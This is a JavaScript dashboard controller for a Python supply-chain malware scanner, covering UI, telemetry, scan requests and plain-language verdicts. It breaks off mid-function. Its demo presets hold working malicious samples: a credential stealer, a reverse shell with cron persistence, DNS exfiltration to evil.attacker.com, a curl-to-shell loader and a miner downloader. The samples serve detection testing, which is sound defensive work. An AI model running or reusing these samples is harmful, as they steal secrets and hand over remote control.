/**
 * SupplyShield — Autonomous Software Supply-Chain Security Audit & Detonation Engine
 * Professional SOC Dashboard & Beginner-Friendly UI Controller
 * 
 * Strict Ground Rules:
 * 1. Zero hardcoded scores, verdicts, or metrics — all state is driven by live API & WebSocket telemetry.
 * 2. Complete XSS prevention — all user/external content is strictly HTML-escaped.
 * 3. 30-Second Beginner Comprehension — plain language verdicts, concrete guidance, and glossary tooltips.
 */

// ── Configuration Constants ──────────────────────────────────────────────────
const API_BASE_URL = window.location.origin.includes(":8000") 
    ? window.location.origin 
    : "http://127.0.0.1:8000";
const WS_BASE_URL = API_BASE_URL.replace(/^http/, "ws") + "/ws/telemetry";

// Maximum limits matching backend enforcement
const MAX_CODE_CHARS = 200000;
const MAX_FILE_BYTES = 512 * 1024; // 512 KB

// ── Application State ────────────────────────────────────────────────────────
let appState = {
    viewMode: sessionStorage.getItem("supplyshield_view_mode") || "simple",
    activePage: "scan",
    currentTab: "code",
    selectedFile: null,
    currentScanReport: null,
    historyData: [],
    terminalAutoScroll: true,
    wsConnected: false,
    wsReconnectAttempts: 0,
    tourCurrentStep: 0
};

let telemetrySocket = null;

// ── Beginner Jargon Glossary ─────────────────────────────────────────────────
// Centralized definitions for beginners and viva defense explanations
const GLOSSARY = {
    "AST": {
        term: "AST (Abstract Syntax Tree)",
        short: "Compiler-level code structure inspection without execution.",
        explanation: "A tree representation of code structure that lets us inspect what code intends to do without running it. It detects hidden commands, dynamic imports, and obfuscation before execution."
    },
    "Sandbox": {
        term: "Sandbox",
        short: "Isolated testing room with zero network and restricted capabilities.",
        explanation: "An isolated testing chamber where code runs without network access and with minimal privileges so it cannot harm your real system or touch your real files."
    },
    "Canary": {
        term: "Canary (Decoy)",
        short: "Decoy credential files placed in the sandbox to catch thieves.",
        explanation: "A decoy file (like fake AWS keys or fake passwords) placed in the sandbox. If the package reads it, we know with certainty it is attempting credential theft."
    },
    "MITRE ATT&CK": {
        term: "MITRE ATT&CK",
        short: "Global framework categorizing real-world cyberattack techniques.",
        explanation: "A globally recognized knowledge base of real-world adversary tactics and techniques used by threat hunters and security defenders worldwide."
    },
    "SLSA": {
        term: "SLSA Framework",
        short: "Supply-chain Levels for Software Artifacts (Build & Source Security).",
        explanation: "Supply-chain Levels for Software Artifacts. An industry security framework measuring how securely software was built, signed, and verified against tampering."
    },
    "Entropy": {
        term: "Shannon Entropy",
        short: "Mathematical measurement of randomness indicating encrypted payloads.",
        explanation: "A mathematical measure of randomness in a string. Very high entropy in long strings (>64 chars) typically indicates encrypted, packed, or compressed malicious code."
    },
    "Obfuscation": {
        term: "Code Obfuscation",
        short: "Techniques used by malware authors to deliberately disguise code.",
        explanation: "Techniques used by malware authors to deliberately make code confusing, encrypted, or disguised so human reviewers and automated scanners cannot read it."
    },
    "Exfiltration": {
        term: "Data Exfiltration",
        short: "Unauthorized transfer of sensitive secrets to an external server.",
        explanation: "The unauthorized transfer of sensitive data (such as API tokens, passwords, or system information) from your computer to an attacker-controlled remote server."
    },
    "Reverse shell": {
        term: "Reverse Shell",
        short: "Outbound connection giving attackers remote command-line control.",
        explanation: "A network connection initiated from your computer back to an attacker's computer, giving them interactive remote command-line control over your system."
    },
    "Typosquatting": {
        term: "Typosquatting",
        short: "Malicious packages published with names mimicking popular libraries.",
        explanation: "Publishing malware with a name almost identical to a popular library (e.g. 'reqeusts' instead of 'requests') hoping developers make a typo and install it by mistake."
    }
};

// ── Plain-Language Rule Explanations ─────────────────────────────────────────
// Maps technical static/dynamic rule IDs to beginner-friendly explanations
const RULES_EXPLANATION = {
    "AST-B64-001": {
        title: "Runs hidden code dynamically",
        risk: "Executes code constructed or decoded at runtime, bypassing static file inspection.",
        whatSaw: "Found call to exec() or eval() on dynamically decoded strings."
    },
    "AST-EXEC-001": {
        title: "Executes dynamic code string",
        risk: "Arbitrary code execution via eval() or exec() without static visibility.",
        whatSaw: "Dynamic string passed directly into Python execution engine."
    },
    "AST-REV-001": {
        title: "Spawns a reverse shell connection",
        risk: "Opens an interactive command prompt to an attacker's remote server.",
        whatSaw: "Detected command redirection to /dev/tcp or network socket."
    },
    "AST-STEAL-001": {
        title: "Harvests cloud credentials & environment secrets",
        risk: "Steals cloud credentials like AWS keys, database passwords, or auth tokens.",
        whatSaw: "Accessed sensitive environment variables or credential directories."
    },
    "AST-OBF-001": {
        title: "Unpacks encrypted or compressed payload",
        risk: "Hides malicious payloads inside base64 or zlib blocks to evade review.",
        whatSaw: "High-entropy decoded string passed to Python compiler."
    },
    "AST-PROC-HIGH": {
        title: "Executes dynamic system commands",
        risk: "Runs shell commands with unknown or dynamic inputs, enabling arbitrary execution.",
        whatSaw: "Invoked subprocess or os.system with computed arguments."
    },
    "AST-PROC-MED": {
        title: "Invokes system subprocess",
        risk: "Runs external commands on the host operating system.",
        whatSaw: "Subprocess invocation with static command parameters."
    },
    "SEC-BIDI-000": {
        title: "Trojan Source hidden characters",
        risk: "Uses invisible Unicode direction characters to disguise code logic from human eyes.",
        whatSaw: "Detected bidirectional override characters (CVE-2021-42574)."
    },
    "SEC-HOMOGLYPH-001": {
        title: "Lookalike typosquatting characters",
        risk: "Impersonates standard modules using identical-looking Cyrillic or Greek symbols.",
        whatSaw: "Non-ASCII confusable characters found in imported names."
    },
    "SEC-PATCH-001": {
        title: "Monkeypatches Python built-in functions",
        risk: "Subverts core language behavior to hide actions from audit monitors.",
        whatSaw: "Direct assignment or mutation of builtins dictionary."
    },
    "DYN-CANARY-001": {
        title: "Decoy secret file accessed (Canary tripped)",
        risk: "Package attempted to read a secret file it had no legitimate reason to touch.",
        whatSaw: "Attempted to open the decoy ~/.aws/credentials file in the isolated room."
    },
    "DYN-NET-001": {
        title: "Unauthorized network connection",
        risk: "Transfers stolen data or downloads a secondary malicious payload.",
        whatSaw: "Attempted outgoing socket connection during package initialization."
    },
    "DYN-SLEEP-001": {
        title: "Evasive execution delay (Time-bomb)",
        risk: "Delays malicious actions to outlast automated sandbox scanners.",
        whatSaw: "Code invoked time.sleep() during setup; intercepted and skipped."
    },
    "DYN-SUBP-001": {
        title: "Spawned system command during execution",
        risk: "Package executed external binaries on the host during runtime.",
        whatSaw: "Caught subprocess.Popen or os.system execution via audit hook."
    },
    "DYN-EVASION-001": {
        title: "Attempted sandbox evasion",
        risk: "Package inspected system characteristics to detect if it was being monitored.",
        whatSaw: "Checked debugger, VM, or container environment indicators."
    }
};

/**
 * Resolves rule metadata with human-friendly fallback for unknown rules
 */
function getRuleExplanation(ruleId, description, evidence) {
    if (RULES_EXPLANATION[ruleId]) {
        return RULES_EXPLANATION[ruleId];
    }
    // Generic intelligent fallback
    let fallbackTitle = "Suspicious behavior detected";
    let fallbackRisk = "This action may compromise system integrity or confidentiality.";
    
    if (ruleId.includes("NET") || (description && description.toLowerCase().includes("network"))) {
        fallbackTitle = "Network connection attempt";
        fallbackRisk = "Package attempted external network communication.";
    } else if (ruleId.includes("STEAL") || ruleId.includes("SECRET") || (description && description.toLowerCase().includes("secret"))) {
        fallbackTitle = "Accesses sensitive information";
        fallbackRisk = "Package searched for passwords, tokens, or configuration keys.";
    } else if (ruleId.includes("OBF") || ruleId.includes("B64")) {
        fallbackTitle = "Obfuscated code structure";
        fallbackRisk = "Package hides its source code behind encoding or compression.";
    }

    return {
        title: fallbackTitle,
        risk: fallbackRisk,
        whatSaw: evidence || description || `Triggered security detection rule [${ruleId}].`
    };
}

// ── Preset Code Samples ──────────────────────────────────────────────────────
const PRESETS = {
    safe: `import math

def calculate_circle_area(radius):
    """Computes area of a circle safely using standard math library."""
    if radius < 0:
        raise ValueError("Radius cannot be negative")
    return math.pi * (radius ** 2)

print(f"Area of radius 5: {calculate_circle_area(5)}")`,

    stealer: `import os
import socket

def harvest_and_exfiltrate():
    # Secret Source Access (Decoy AWS canary key)
    aws_key = os.environ.get("AWS_SECRET_ACCESS_KEY", "AKIAIOSFODNN7EXAMPLE")
    env_data = str(dict(os.environ))

    # Network Sink Exfiltration
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("192.168.1.100", 4444))
        s.send(f"STOLEN_AWS_KEY: {aws_key}".encode())
        s.close()
    except Exception:
        pass

harvest_and_exfiltrate()`,

    backdoor: `import base64
import zlib

# Obfuscated payload hiding dynamic execution
encoded_payload = "eJxLzs8tKErMS1VISTXUUUjMyc8rKkrNK1EwMjC2MjC10DM00zMBADxICz8="

def execute_stage2():
    # Dynamic decoding and exec invocation
    decoded = base64.b64decode(encoded_payload)
    decompressed = zlib.decompress(decoded).decode('utf-8')
    exec(decompressed)

execute_stage2()`,

    reverse_shell: `import os
import subprocess

def setup_persistence():
    cron_cmd = "echo '*/5 * * * * /bin/bash -c \\"bash -i >& /dev/tcp/194.26.29.112/9001 0>&1\\"' | crontab -"
    os.system(cron_cmd)

def spawn_reverse_shell():
    subprocess.Popen(
        ["/bin/bash", "-c", "bash -i >& /dev/tcp/194.26.29.112/9001 0>&1"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

setup_persistence()
spawn_reverse_shell()`,

    dns_exfil: `import os
import socket
import base64

def harvest_environment():
    sensitive_keys = ["AWS_SECRET", "DATABASE_URL", "API_KEY", "TOKEN", "PASSWORD"]
    stolen = {}
    for key, value in os.environ.items():
        for pattern in sensitive_keys:
            if pattern.lower() in key.lower():
                stolen[key] = value
    return stolen

def dns_tunnel_exfil(data, attacker_domain="evil.attacker.com"):
    encoded = base64.b64encode(data.encode()).decode()
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    for chunk in chunks:
        query = f"{chunk}.{attacker_domain}"
        try:
            socket.getaddrinfo(query, None)
        except Exception:
            pass

dns_tunnel_exfil(str(harvest_environment()))`,

    typosquat: `# Homoglyph Trojan Source and dynamic loading
def load_helper():
    # Uses dynamic importlib to disguise os module load
    mod = __import__("o" + "s")
    getattr(mod, "sys" + "tem")("curl -s http://194.26.29.112/loader | sh")

load_helper()`,

    cryptominer: `import os
import subprocess
import urllib.request

MINER_URL = "http://194.26.29.112/xmrig"

def download_and_run():
    tmp_path = os.path.join(os.path.expanduser("~"), ".cache", "system-update")
    try:
        urllib.request.urlretrieve(MINER_URL, tmp_path)
        os.system(f"chmod +x {tmp_path}")
        subprocess.Popen([tmp_path, "--pool", "stratum+tcp://pool.minexmr.com:4444"])
    except Exception:
        pass

download_and_run()`
};

// ── Onboarding Tour Steps ────────────────────────────────────────────────────
const TOUR_STEPS = [
    {
        title: "Welcome to SupplyShield",
        body: "SupplyShield protects your development environment and CI/CD pipelines from malicious Python packages before you run <code>pip install</code>.",
        badge: "Step 1 of 5"
    },
    {
        title: "1. Provide Target Source Code",
        body: "Paste Python code directly into the editor or upload a <code>.py</code> package file. Use the <strong>'Try a safe package'</strong> or <strong>'Try a malicious package'</strong> buttons for instant demonstration.",
        badge: "Step 2 of 5"
    },
    {
        title: "2. Autonomous 3-Stage Pipeline",
        body: "Every scan flows through: <strong>1) Compiler AST static checks</strong>, <strong>2) Ephemeral Docker sandbox detonation</strong> with canary traps, and <strong>3) Composite risk scoring</strong>.",
        badge: "Step 3 of 5"
    },
    {
        title: "3. Understand Verdicts in 30 Seconds",
        body: "No security degree required: verdicts are stated in plain English (<em>'Looks safe'</em> vs <em>'Dangerous: do not install'</em>) with concrete step-by-step guidance on what to do next.",
        badge: "Step 4 of 5"
    },
    {
        title: "4. Simple vs. Technical View",
        body: "Use the <strong>Simple / Technical</strong> toggle in the top bar to switch between executive summaries and deep SOC telemetry with MITRE ATT&CK techniques.",
        badge: "Step 5 of 5"
    }
];

// ── Initialization ───────────────────────────────────────────────────────────
document.addEventListener("DOMContentLoaded", () => {
    initTheme();
    initViewMode();
    initGlossary();
    initWebSocket();
    checkBackendHealth();
    loadPresetSample("safe");
    checkFirstRunTour();
});

// ── View Mode Switching (Simple vs Technical) ────────────────────────────────
function initViewMode() {
    setViewMode(appState.viewMode);
}

function setViewMode(mode) {
    appState.viewMode = mode;
    sessionStorage.setItem("supplyshield_view_mode", mode);

    const btnSimple = document.getElementById("btn-view-simple");
    const btnTech = document.getElementById("btn-view-technical");
    const simpleContainer = document.getElementById("simple-view-findings");
    const techContainer = document.getElementById("technical-view-findings");

    if (mode === "technical") {
        if (btnTech) {
            btnTech.classList.add("active");
            btnTech.setAttribute("aria-checked", "true");
        }
        if (btnSimple) {
            btnSimple.classList.remove("active");
            btnSimple.setAttribute("aria-checked", "false");
        }
        if (simpleContainer) simpleContainer.classList.add("hidden");
        if (techContainer) techContainer.classList.remove("hidden");
    } else {
        if (btnSimple) {
            btnSimple.classList.add("active");
            btnSimple.setAttribute("aria-checked", "true");
        }
        if (btnTech) {
            btnTech.classList.remove("active");
            btnTech.setAttribute("aria-checked", "false");
        }
        if (simpleContainer) simpleContainer.classList.remove("hidden");
        if (techContainer) techContainer.classList.add("hidden");
    }
}

// ── Theme Switching System ───────────────────────────────────────────────────
function initTheme() {
    const savedTheme = localStorage.getItem("supplyshield_theme") || "dark";
    setTheme(savedTheme);
}

function toggleTheme() {
    const isLight = document.body.classList.contains("light-theme");
    setTheme(isLight ? "dark" : "light");
}

function setTheme(theme) {
    const icon = document.getElementById("theme-icon");
    if (theme === "light") {
        document.body.classList.remove("dark-theme");
        document.body.classList.add("light-theme");
        if (icon) {
            icon.className = "fa-solid fa-moon";
            icon.style.color = "var(--text-secondary)";
        }
    } else {
        document.body.classList.remove("light-theme");
        document.body.classList.add("dark-theme");
        if (icon) {
            icon.className = "fa-solid fa-sun";
            icon.style.color = "var(--color-medium)";
        }
    }
    localStorage.setItem("supplyshield_theme", theme);
}

// ── Navigation Controller ────────────────────────────────────────────────────
function navigateTo(page) {
    appState.activePage = page;

    // Toggle nav buttons
    document.querySelectorAll(".nav-link-btn").forEach(btn => btn.classList.remove("active"));
    const activeBtn = document.getElementById(`nav-${page}-btn`);
    if (activeBtn) activeBtn.classList.add("active");

    // Toggle page views
    document.querySelectorAll(".page-view").forEach(v => v.classList.add("hidden"));
    const targetView = document.getElementById(`view-${page}`);
    if (targetView) targetView.classList.remove("hidden");

    if (page === "history") {
        loadHistoryData();
    }
}

// ── Input Tab Controller (Code vs File) ──────────────────────────────────────
function switchInputTab(tab) {
    appState.currentTab = tab;
    const tabCodeBtn = document.getElementById("tab-btn-code");
    const tabFileBtn = document.getElementById("tab-btn-file");
    const tabCodeContent = document.getElementById("tab-content-code");
    const tabFileContent = document.getElementById("tab-content-file");

    if (tab === "code") {
        tabCodeBtn.classList.add("active");
        tabCodeBtn.setAttribute("aria-selected", "true");
        tabFileBtn.classList.remove("active");
        tabFileBtn.setAttribute("aria-selected", "false");
        tabCodeContent.classList.remove("hidden");
        tabFileContent.classList.add("hidden");
    } else {
        tabFileBtn.classList.add("active");
        tabFileBtn.setAttribute("aria-selected", "true");
        tabCodeBtn.classList.remove("active");
        tabCodeBtn.setAttribute("aria-selected", "false");
        tabFileContent.classList.remove("hidden");
        tabCodeContent.classList.add("hidden");
    }
}

// ── Sample Presets Loader ────────────────────────────────────────────────────
function loadPresetSample(type) {
    switchInputTab("code");
    const textarea = document.getElementById("code-input");
    if (PRESETS[type] && textarea) {
        textarea.value = PRESETS[type];
        updateCharCount();
        logTerminal("INFO", `Loaded sample preset: [${type.toUpperCase()}]`);
    }
}

function loadPresetFromDropdown(val) {
    if (val) {
        loadPresetSample(val);
    }
}

function updateCharCount() {
    const textarea = document.getElementById("code-input");
    const countDisplay = document.getElementById("char-counter-text");
    const scanBtn = document.getElementById("scan-code-btn");
    const length = textarea ? textarea.value.length : 0;

    if (countDisplay) {
        countDisplay.textContent = `${length.toLocaleString()} / 200,000 characters`;
        if (length > MAX_CODE_CHARS) {
            countDisplay.style.color = "var(--color-critical)";
        } else {
            countDisplay.style.color = "var(--text-muted)";
        }
    }

    if (scanBtn) {
        if (length === 0) {
            scanBtn.title = "Paste some code or pick an example first";
        } else if (length > MAX_CODE_CHARS) {
            scanBtn.title = `Code exceeds maximum allowed size (${MAX_CODE_CHARS} characters)`;
        } else {
            scanBtn.title = "Execute security audit";
        }
    }
}

// ── File Drag & Drop Handlers ────────────────────────────────────────────────
function handleDragOver(e) {
    e.preventDefault();
    e.stopPropagation();
    const zone = document.getElementById("file-dropzone");
    if (zone) zone.classList.add("dragover");
}

function handleDragLeave(e) {
    e.preventDefault();
    e.stopPropagation();
    const zone = document.getElementById("file-dropzone");
    if (zone) zone.classList.remove("dragover");
}

function handleFileDrop(e) {
    e.preventDefault();
    e.stopPropagation();
    const zone = document.getElementById("file-dropzone");
    if (zone) zone.classList.remove("dragover");

    if (e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files.length > 0) {
        const file = e.dataTransfer.files[0];
        processSelectedFile(file);
    }
}

function handleFilePicked(e) {
    if (e.target && e.target.files && e.target.files.length > 0) {
        processSelectedFile(e.target.files[0]);
    }
}

function processSelectedFile(file) {
    if (!file.name.endsWith(".py")) {
        alert("Invalid file format. SupplyShield accepts only Python (.py) source packages.");
        return;
    }

    if (file.size > MAX_FILE_BYTES) {
        alert(`File is too large (${(file.size / 1024).toFixed(1)} KB). Maximum allowed file size is 512 KB.`);
        return;
    }

    appState.selectedFile = file;
    const badge = document.getElementById("selected-file-badge");
    const scanFileBtn = document.getElementById("scan-file-btn");

    if (badge) {
        badge.textContent = `Selected: ${file.name} (${(file.size / 1024).toFixed(1)} KB)`;
        badge.classList.remove("hidden");
    }

    if (scanFileBtn) {
        scanFileBtn.disabled = false;
        scanFileBtn.title = "Detonate and scan selected file";
    }

    logTerminal("INFO", `Staged file for detonation: ${file.name} (${file.size} bytes)`);
}

// ── Backend API Client & Security Headers ────────────────────────────────────
function getAuthHeaders() {
    const headers = {};
    const apiKey = sessionStorage.getItem("supplyshield_api_key");
    if (apiKey && apiKey.trim()) {
        headers["X-API-Key"] = apiKey.trim();
        headers["Authorization"] = `Bearer ${apiKey.trim()}`;
    }
    return headers;
}

async function checkBackendHealth() {
    const pill = document.getElementById("backend-status-pill");
    const dot = document.getElementById("status-dot");
    const text = document.getElementById("status-text");
    const offlineBanner = document.getElementById("offline-banner");

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3500);

        const res = await fetch(`${API_BASE_URL}/api/health`, {
            signal: controller.signal,
            headers: getAuthHeaders()
        });
        clearTimeout(timeoutId);

        if (res.ok) {
            if (dot) dot.style.backgroundColor = "var(--color-clean)";
            if (text) text.textContent = "Online";
            if (offlineBanner) offlineBanner.classList.add("hidden");
        } else {
            throw new Error(`HTTP ${res.status}`);
        }
    } catch (err) {
        if (dot) dot.style.backgroundColor = "var(--color-critical)";
        if (text) text.textContent = "Offline";
        if (offlineBanner) offlineBanner.classList.remove("hidden");
    }
}

// ── WebSocket Telemetry Feed ─────────────────────────────────────────────────
function initWebSocket() {
    try {
        if (telemetrySocket && telemetrySocket.readyState === WebSocket.OPEN) {
            return;
        }

        telemetrySocket = new WebSocket(WS_BASE_URL);

        telemetrySocket.onopen = () => {
            appState.wsConnected = true;
            appState.wsReconnectAttempts = 0;
            logTerminal("INFO", "[SYSTEM] Telemetry channel connected to backend gateway.");
        };

        telemetrySocket.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                handleIncomingTelemetry(data);
            } catch (err) {
                logTerminal("INFO", event.data);
            }
        };

        telemetrySocket.onclose = () => {
            appState.wsConnected = false;
            // Exponential backoff reconnect: 1s, 2s, 4s, 8s, max 16s
            appState.wsReconnectAttempts = Math.min(appState.wsReconnectAttempts + 1, 4);
            const delay = Math.pow(2, appState.wsReconnectAttempts) * 1000;
            setTimeout(initWebSocket, delay);
        };

        telemetrySocket.onerror = () => {
            appState.wsConnected = false;
        };
    } catch (e) {
        // WebSocket unavailable, graceful fallback
    }
}

function handleIncomingTelemetry(telemetry) {
    if (telemetry.type === "TELEMETRY" || telemetry.stage) {
        const stage = telemetry.stage || "ENGINE";
        const message = telemetry.message || "";
        const level = telemetry.level || "INFO";

        // Update visual pipeline stepper based on incoming stage
        updatePipelineStepper(stage);

        logTerminal(level, `[${stage}] ${message}`);
    }
}

function updatePipelineStepper(stageName) {
    const nodeAst = document.getElementById("step-node-ast");
    const nodeSandbox = document.getElementById("step-node-sandbox");
    const nodeScore = document.getElementById("step-node-score");

    const upper = stageName.toUpperCase();

    if (upper.includes("AST") || upper.includes("STATIC")) {
        if (nodeAst) nodeAst.classList.add("active");
    } else if (upper.includes("SANDBOX") || upper.includes("DETONAT")) {
        if (nodeAst) {
            nodeAst.classList.remove("active");
            nodeAst.classList.add("completed");
        }
        if (nodeSandbox) nodeSandbox.classList.add("active");
    } else if (upper.includes("SCOR") || upper.includes("RISK") || upper.includes("VERDICT")) {
        if (nodeSandbox) {
            nodeSandbox.classList.remove("active");
            nodeSandbox.classList.add("completed");
        }
        if (nodeScore) nodeScore.classList.add("active");
    }
}

function resetPipelineStepper() {
    ["step-node-ast", "step-node-sandbox", "step-node-score"].forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            el.classList.remove("active", "completed");
        }
    });
}

// ── Terminal Controller ──────────────────────────────────────────────────────
function logTerminal(level, message) {
    const terminal = document.getElementById("terminal-logs-stream");
    if (!terminal) return;

    const time = new Date().toLocaleTimeString();
    const line = document.createElement("div");

    let colorStyle = "var(--text-secondary)";
    if (level === "CRITICAL" || level === "ERROR") {
        colorStyle = "var(--color-critical)";
    } else if (level === "WARNING") {
        colorStyle = "var(--color-high)";
    } else if (level === "SUCCESS" || level === "CLEAN") {
        colorStyle = "var(--color-clean)";
    } else if (level === "INFO") {
        colorStyle = "var(--color-accent)";
    }

    line.style.color = colorStyle;
    line.style.marginBottom = "2px";
    line.style.wordBreak = "break-all";
    line.textContent = `[${time}] ${message}`;

    terminal.appendChild(line);

    if (appState.terminalAutoScroll) {
        terminal.scrollTop = terminal.scrollHeight;
    }
}

function toggleTerminalAutoScroll() {
    appState.terminalAutoScroll = !appState.terminalAutoScroll;
    const btn = document.getElementById("btn-autoscroll");
    if (btn) {
        btn.textContent = `Auto-scroll: ${appState.terminalAutoScroll ? "ON" : "OFF"}`;
    }
}

function clearTerminalLogs() {
    const terminal = document.getElementById("terminal-logs-stream");
    if (terminal) {
        terminal.innerHTML = "";
        logTerminal("INFO", "[SYSTEM] Terminal logs cleared.");
    }
}

function copyTerminalLogs() {
    const terminal = document.getElementById("terminal-logs-stream");
    if (terminal) {
        navigator.clipboard.writeText(terminal.innerText)
            .then(() => alert("Terminal logs copied to clipboard!"))
            .catch(() => alert("Could not copy logs."));
    }
}

// ── Scan Execution Handler ───────────────────────────────────────────────────
async function executeScan(type) {
    resetPipelineStepper();
    const nodeAst = document.getElementById("step-node-ast");
    if (nodeAst) nodeAst.classList.add("active");

    let scanBtn = null;
    let endpoint = "";
    let requestOptions = {
        headers: getAuthHeaders()
    };

    if (type === "code") {
        scanBtn = document.getElementById("scan-code-btn");
        const codeInput = document.getElementById("code-input");
        const code = codeInput ? codeInput.value : "";

        if (!code || !code.trim()) {
            alert("Please paste Python source code or pick an example package first.");
            return;
        }

        if (code.length > MAX_CODE_CHARS) {
            alert(`Source code exceeds character limit (${code.length} > ${MAX_CODE_CHARS}).`);
            return;
        }

        endpoint = `${API_BASE_URL}/api/scan/code`;
        requestOptions.method = "POST";
        requestOptions.headers["Content-Type"] = "application/json";
        requestOptions.body = JSON.stringify({
            code: code,
            filename: "input_sample.py"
        });

        if (scanBtn) {
            scanBtn.disabled = true;
            scanBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i> Scanning code...`;
        }
    } else {
        scanBtn = document.getElementById("scan-file-btn");
        if (!appState.selectedFile) {
            alert("Please choose a .py package file first.");
            return;
        }

        endpoint = `${API_BASE_URL}/api/scan/package`;
        const formData = new FormData();
        formData.append("file", appState.selectedFile);

        requestOptions.method = "POST";
        requestOptions.body = formData;

        if (scanBtn) {
            scanBtn.disabled = true;
            scanBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i> Detonating file...`;
        }
    }

    logTerminal("INFO", `[START] Initiating autonomous scan on target package...`);

    try {
        const response = await fetch(endpoint, requestOptions);

        if (!response.ok) {
            let errorMsg = `Server returned HTTP ${response.status}`;
            if (response.status === 401 || response.status === 403) {
                errorMsg = "Authentication required: Please configure a valid API Key in Settings (gear icon).";
            } else if (response.status === 413) {
                errorMsg = "Payload Too Large: Target code exceeds maximum allowed size (200k chars / 512KB).";
            } else if (response.status === 429) {
                errorMsg = "Rate limit exceeded. Please wait a moment before running another scan.";
            } else {
                try {
                    const errJson = await response.json();
                    if (errJson.detail) errorMsg = errJson.detail;
                } catch (_) {}
            }
            throw new Error(errorMsg);
        }

        const rawResult = await response.json();
        const report = rawResult.report || rawResult.result || rawResult;

        appState.currentScanReport = report;

        // Complete all stepper nodes
        ["step-node-ast", "step-node-sandbox", "step-node-score"].forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                el.classList.remove("active");
                el.classList.add("completed");
            }
        });

        // Update dashboard with real findings
        updateThreatDashboard(report);

    } catch (err) {
        alert(`Scan failed: ${err.message}`);
        logTerminal("CRITICAL", `[ERROR] Scan aborted: ${err.message}`);
        resetPipelineStepper();
    } finally {
        if (scanBtn) {
            scanBtn.disabled = false;
            if (type === "code") {
                scanBtn.innerHTML = `<i class="fa-solid fa-shield-virus" aria-hidden="true"></i> Scan code`;
            } else {
                scanBtn.innerHTML = `<i class="fa-solid fa-shield-virus" aria-hidden="true"></i> Scan file`;
            }
        }
    }
}

// ── Update UI Dashboard with Real Findings ───────────────────────────────────
function updateThreatDashboard(report) {
    if (!report) return;

    const riskScore = Math.round(report.composite_risk_score !== undefined ? report.composite_risk_score : (report.risk_score || 0));
    const verdict = report.verdict || "CLEAN";
    const slsaTier = report.slsa_security_level || report.slsa_tier || "SLSA Level 4";
    const findings = [
        ...(report.static_findings || []),
        ...(report.dynamic_findings || []),
        ...(report.findings || [])
    ];

    // 1. Animate Risk Gauge
    const scoreNum = document.getElementById("risk-score-num");
    const gaugeCircle = document.getElementById("gauge-fill-circle");

    if (scoreNum) scoreNum.textContent = riskScore;
    if (gaugeCircle) {
        // SVG circle circumference = 2 * PI * 42 ≈ 264
        const circumference = 264;
        const offset = circumference - (riskScore / 100) * circumference;
        gaugeCircle.style.strokeDashoffset = offset;

        if (riskScore >= 70) {
            gaugeCircle.style.stroke = "var(--color-critical)";
        } else if (riskScore >= 30) {
            gaugeCircle.style.stroke = "var(--color-medium)";
        } else {
            gaugeCircle.style.stroke = "var(--color-clean)";
        }
    }

    // 2. Verdict Banner & Badges
    const bannerBox = document.getElementById("verdict-banner-box");
    const bannerIcon = document.getElementById("verdict-banner-icon");
    const humanSentence = document.getElementById("verdict-human-sentence");
    const techBadge = document.getElementById("verdict-tech-badge");
    const plainBadge = document.getElementById("verdict-plain-badge");
    const slsaBadge = document.getElementById("slsa-tier-badge");
    const durationBadge = document.getElementById("scan-duration-badge");

    if (techBadge) techBadge.textContent = verdict;
    if (slsaBadge) slsaBadge.textContent = slsaTier;

    // Plain English label mapping
    let plainLabel = "Looks safe";
    let bannerClass = "clean";
    let iconHtml = '<i class="fa-solid fa-circle-check" style="color: var(--color-clean);"></i>';

    if (verdict === "CRITICAL_MALICIOUS" || verdict === "BLOCK") {
        plainLabel = "Dangerous: do not install";
        bannerClass = "danger";
        iconHtml = '<i class="fa-solid fa-triangle-exclamation" style="color: var(--color-critical);"></i>';
    } else if (verdict === "SUSPICIOUS" || verdict === "REVIEW") {
        plainLabel = "Needs a human review";
        bannerClass = "suspicious";
        iconHtml = '<i class="fa-solid fa-circle-exclamation" style="color: var(--color-medium);"></i>';
    }

    if (plainBadge) {
        plainBadge.textContent = plainLabel;
        plainBadge.className = `badge-tag ${bannerClass === "danger" ? "badge-critical" : (bannerClass === "suspicious" ? "badge-medium" : "badge-clean")}`;
    }

    if (techBadge) {
        techBadge.className = `badge-tag ${bannerClass === "danger" ? "badge-critical" : (bannerClass === "suspicious" ? "badge-medium" : "badge-clean")}`;
    }

    if (bannerBox) {
        bannerBox.className = `verdict-banner ${bannerClass}`;
    }
    if (bannerIcon) {
        bannerIcon.innerHTML = iconHtml;
    }

    // Big human sentence generated from real findings
    if (humanSentence) {
        humanSentence.textContent = generateHumanSummarySentence(verdict, findings);
    }

    // Scan Duration Badge
    if (durationBadge && report.execution_metrics) {
        const totalMs = (report.execution_metrics.ast_scan_ms || 0) + (report.execution_metrics.sandbox_time_ms || 0);
        durationBadge.textContent = `Duration: ${totalMs > 1000 ? (totalMs / 1000).toFixed(2) + "s" : totalMs.toFixed(1) + "ms"}`;
    }

    // 3. Concrete Action Guidance
    renderActionGuidance(verdict, findings);

    // 4. Render Findings in Simple & Technical Views
    renderFindingsViews(findings);

    // 5. Enable Export Buttons
    const btnHtml = document.getElementById("btn-export-html");
    const btnJson = document.getElementById("btn-export-json");
    if (btnHtml) btnHtml.disabled = false;
    if (btnJson) btnJson.disabled = false;

    logTerminal("SUCCESS", `[VERDICT] ${verdict} (Risk: ${riskScore}/100) — Guidance: ${plainLabel}`);
}

// ── Plain-Language Summary Generator ─────────────────────────────────────────
function generateHumanSummarySentence(verdict, findings) {
    if (!findings || findings.length === 0) {
        return "Looks safe. We found nothing suspicious in the code structure or runtime behavior.";
    }

    const hasCanary = findings.some(f => (f.rule_id || "").includes("CANARY") || (f.category || "").includes("CANARY"));
    const hasNet = findings.some(f => (f.rule_id || "").includes("NET") || (f.category || "").includes("SINK"));
    const hasReverse = findings.some(f => (f.rule_id || "").includes("REV"));
    const hasObf = findings.some(f => (f.rule_id || "").includes("OBF") || (f.rule_id || "").includes("B64"));
    const hasProc = findings.some(f => (f.rule_id || "").includes("PROC"));
